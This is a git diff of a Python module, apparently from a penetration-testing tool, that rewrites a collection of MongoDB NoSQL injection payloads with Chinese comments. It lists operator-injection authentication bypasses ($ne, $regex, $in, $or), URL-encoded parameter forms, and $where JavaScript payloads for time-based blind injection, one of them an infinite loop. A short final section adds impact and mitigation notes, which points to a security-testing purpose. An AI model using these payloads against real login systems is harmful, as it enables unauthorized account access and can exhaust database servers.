@@ -1,98 +1,134 @@
 """
-MongoDB 認證繞過注入載荷
-包含各種針對登入/認證功能的MongoDB注入載荷
+MongoDB身份验证绕过注入载荷
+包含各种用于MongoDB身份验证绕过的注入载荷
 """
 
-# 單一參數認證繞過 (用戶名或密碼字段)
-SINGLE_PARAM_PAYLOADS = [
-    # 基本繞過
-    {"name": "永真條件", "value": {"$ne": ""}, "description": "使任何條件都為真"},
-    {"name": "空值匹配", "value": {"$exists": False}, "description": "匹配字段不存在的文檔"},
-    {"name": "正則表達式匹配所有", "value": {"$regex": ".*"}, "description": "使用正則表達式匹配任意字符串"},
-    {"name": "正則表達式不區分大小寫", "value": {"$regex": ".*", "$options": "i"}, "description": "不區分大小寫的正則表達式匹配"},
-    {"name": "包含操作", "value": {"$in": ["", "admin", "administrator", "user", "root"]}, "description": "匹配常見用戶名"},
-    {"name": "或條件", "value": {"$or": [{"username": ""}, {"username": "admin"}]}, "description": "使用$or操作符匹配多個可能值"},
+# MongoDB 单参数身份验证绕过载荷
+SINGLE_PARAM_AUTH_BYPASS_PAYLOADS = [
+    # 基本的空密码绕过
+    {"username": {"$ne": None}},
+    {"username": {"$ne": ""}},
+    {"username": {"$ne": "invalid"}},
     
-    # JavaScript注入
-    {"name": "JavaScript空條件", "value": {"$where": "return true"}, "description": "使用JavaScript返回永真值"},
-    {"name": "JavaScript字段長度檢查", "value": {"$where": "this.password.length > 0"}, "description": "檢查密碼長度"},
+    # 字符串运算符
+    {"username": {"$regex": ".*"}},
+    {"username": {"$regex": "^admin"}},
+    {"username": {"$regex": "^adm", "$options": "i"}},
     
-    # 數據類型繞過
-    {"name": "整數替換", "value": 1, "description": "嘗試使用整數類型"},
-    {"name": "布爾值替換", "value": True, "description": "嘗試使用布爾類型"},
-    {"name": "空數組", "value": [], "description": "嘗試使用空數組"},
-    {"name": "空對象", "value": {}, "description": "嘗試使用空對象"},
+    # 数组运算符
+    {"username": {"$in": ["admin", "administrator", "root"]}},
+    {"username": {"$elemMatch": {"$eq": "admin"}}},
+    
+    # JavaScript注入绕过
+    {"username": {"$where": "this.username != null"}},
+    {"username": {"$where": "return true"}},
+    {"username": {"$where": "function() { return true; }"}},
+    {"username": {"$where": "function() { sleep(1); return true; }"}},
+    
+    # 逻辑运算符
+    {"username": {"$not": {"$eq": "invalid"}}},
+    {"username": {"$or": [{"$eq": "admin"}, {"$ne": ""}]}},
+    
+    # 异常类型注入
+    {"username": {"$exists": True}},
+    {"username": {"$type": 2}},  # String类型
+    {"username": {"$type": "string"}},
 ]
 
-# 雙參數認證繞過 (同時針對用戶名和密碼字段)
-AUTH_BYPASS_PAYLOADS = [
-    # 基本組合
-    {
-        "name": "基本認證繞過",
-        "credentials": {"username": {"$ne": ""}, "password": {"$ne": ""}},
-        "description": "最常見的認證繞過載荷"
-    },
-    {
-        "name": "管理員用戶繞過",
-        "credentials": {"username": "admin", "password": {"$ne": ""}},
-        "description": "針對admin賬戶的密碼繞過"
-    },
-    {
-        "name": "管理員模糊匹配",
-        "credentials": {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
-        "description": "匹配以admin開頭的用戶名"
-    },
-    {
-        "name": "常見用戶繞過",
-        "credentials": {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
-        "description": "匹配常見管理用戶名"
-    },
+# MongoDB 双参数身份验证绕过载荷
+DUAL_PARAM_AUTH_BYPASS_PAYLOADS = [
+    # 基本的用户名密码组合绕过
+    {"username": "admin", "password": {"$ne": ""}},
+    {"username": {"$ne": ""}, "password": {"$ne": ""}},
+    {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}},
     
-    # 高級組合
-    {
-        "name": "參數傳播",
-        "credentials": {"username": {"$ne": ""}, "password": {"$ne": ""}},
-        "url_params": "username[$ne]=&password[$ne]=",
-        "description": "URL參數形式的載荷"
-    },
-    {
-        "name": "空值組合",
-        "credentials": {"username": {"$exists": True}, "password": {"$exists": True}},
-        "description": "只檢查字段存在性"
-    },
-    {
-        "name": "正則與永真",
-        "credentials": {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
-        "description": "用戶名使用正則，密碼使用$ne"
-    },
+    # 正则表达式绕过
+    {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
+    {"username": {"$regex": "^adm", "$options": "i"}, "password": {"$regex": ".*"}},
+    
+    # 嵌套文档绕过
+    {"username": "admin", "password": {"$in": ["", None, "password", "123456"]}},
+    {"username": {"$ne": ""}, "password": {"$in": ["", None, "password", "123456"]}},
+    
+    # 组合逻辑绕过
+    {"$or": [{"username": "admin", "password": {"$regex": ".*"}}, {"password": {"$exists": False}}]},
+    {"$or": [{"username": "admin"}, {"admin": True}], "password": {"$ne": ""}},
+    
+    # 使用JSON运算符绕过
+    {"username": {"$eq": "admin"}, "password": {"$regex": "^pass"}},
+    {"username": {"$gt": ""}, "password": {"$exists": True}},
 ]
 
-# 集合參數繞過 (單一JSON對象包含邏輯操作符)
-LOGICAL_AUTH_PAYLOADS = [
-    {
-        "name": "OR操作符組合",
-        "payload": {"$or": [{"username": "admin", "password": {"$regex": ".*"}}, {"username": {"$ne": ""}}]},
-        "description": "使用$or操作符組合多種可能情況"
-    },
-    {
-        "name": "AND操作符組合",
-        "payload": {"$and": [{"username": {"$ne": "invalid"}}, {"password": {"$ne": "invalid"}}]},
-        "description": "使用$and操作符組合條件"
-    },
-    {
-        "name": "NOR操作符否定",
-        "payload": {"$nor": [{"username": {"$eq": "invalid"}}, {"password": {"$eq": "invalid"}}]},
-        "description": "使用$nor操作符否定無效條件"
-    },
+# MongoDB 逻辑操作绕过载荷
+LOGICAL_OPERATIONS_PAYLOADS = [
+    # OR操作符绕过
+    {"$or": [{"username": "admin"}, {"username": "administrator"}]},
+    {"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]},
+    {"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]},
+    
+    # AND操作符组合
+    {"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
+    {"$and": [{"username": {"$in": ["admin", "root"]}}, {"password": {"$regex": ".*"}}]},
+    
+    # NOR操作符
+    {"$nor": [{"username": {"$eq": "invalid"}}, {"password": {"$eq": "invalid"}}]},
+    {"$nor": [{"username": ""}, {"password": ""}]},
+    
+    # 复杂组合
+    {"$or": [{"$and": [{"username": "admin"}, {"password": {"$regex": ".*"}}]}, {"isAdmin": True}]},
+    {"$or": [{"admin": True}, {"$and": [{"username": {"$ne": ""}}, {"password": {"$regex": ".*"}}]}]},
 ]
 
-# 獲取推薦的認證繞過載荷組合
-def get_recommended_auth_payloads():
-    """獲取推薦的認證繞過載荷組合"""
-    return [
-        {"username": {"$ne": ""}, "password": {"$ne": ""}},
-        {"username": "admin", "password": {"$ne": ""}},
-        {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
-        {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
-        {"$or": [{"username": "admin"}, {"username": {"$regex": "admin"}}], "password": {"$ne": ""}}
-    ] 
+# NoSQL命令执行载荷
+NOSQL_COMMAND_EXECUTION_PAYLOADS = [
+    {"username": {"$where": "sleep(5000)"}},
+    {"username": {"$where": "function(){sleep(5000)}"}},
+    {"username": {"$where": "function(){return sleep(5000)}"}},
+    {"username": {"$function": {"body": "return sleep(5000)"}}},
+    {"username": {"$where": "function(){while(1){}}"}},  # 死循环，谨慎使用
+    {"username": {"$where": "function(){var d = new Date(); while(new Date()-d<5000){}}; return true;"}},
+]
+
+# 安全的HTTP参数格式载荷 (URL-encoded)
+URL_ENCODED_PAYLOADS = [
+    "username[$ne]=invalid",
+    "username[$regex]=.*",
+    "username[$in][]=admin&username[$in][]=administrator",
+    "username[$exists]=true",
+    "username=admin&password[$ne]=",
+    "$or[0][username]=admin&$or[1][username][$regex]=.*",
+    "$or[0][username]=admin&$or[1][password][$ne]=",
+    "username[$ne]=invalid&password[$ne]=invalid",
+]
+
+# 详细测试载荷
+DETAILED_PAYLOAD_OBJECTS = [
+    {
+        "name": "管理员空密码绕过",
+        "payload": {"username": "admin", "password": {"$ne": ""}},
+        "description": "尝试使用空密码绕过admin用户登录",
+        "impact": "认证绕过",
+        "mitigation": "验证所有输入，禁用$ne等运算符"
+    },
+    {
+        "name": "正则表达式枚举用户",
+        "payload": {"username": {"$regex": "^a"}, "password": {"$ne": ""}},
+        "description": "使用正则表达式枚举以'a'开头的用户",
+        "impact": "用户信息泄露",
+        "mitigation": "禁用$regex操作符或进行查询白名单过滤"
+    },
+    {
+        "name": "延时操作检测注入点",
+        "payload": {"username": {"$where": "function(){var d = new Date(); while(new Date()-d<3000){}}; return true;"}},
+        "description": "执行一个延时操作来检测盲注可能性",
+        "impact": "服务器资源消耗",
+        "mitigation": "禁用$where操作符或JavaScript执行"
+    },
+    {
+        "name": "布尔注入测试",
+        "payload": {"$where": "this.username == 'admin' && this.password.length > 5"},
+        "description": "使用布尔逻辑测试密码长度",
+        "impact": "信息泄露",
+        "mitigation": "使用参数化查询并禁用$where操作符"
+    }
+] 
